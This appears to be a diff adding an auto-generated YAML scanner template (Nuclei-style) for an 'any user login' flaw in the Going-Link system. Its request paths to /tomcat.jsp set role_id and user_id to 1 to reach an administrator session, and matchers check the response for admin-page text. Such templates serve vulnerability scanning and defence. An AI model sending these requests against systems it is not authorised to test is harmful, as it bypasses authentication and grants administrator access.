@@ -1,0 +1,26 @@
+# 自动生成：tools/import_ref_pocs.py，请勿手工编辑（重跑会覆盖）
+id: ref-going-link-any_user_login
+info:
+  name: "Going-Link any_user_login"
+  author: imported-from-myscan
+  severity: high
+  tags: [imported, going-link, ref-poc, anyuserlogin]
+  description: "由参考项目脚本静态导入：Going-Link/any_user_login（类型 ANYUSERLOGIN）。"
+http:
+  - method: GET
+    path:
+      - "/"
+      - "/main.screen"
+      - "/tomcat.jsp?dataName=role_id&dataValue=1"
+      - "/tomcat.jsp?dataName=user_id&dataValue=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "Server Info"
+          - "Going-Link"
+          - "云系统管理员"
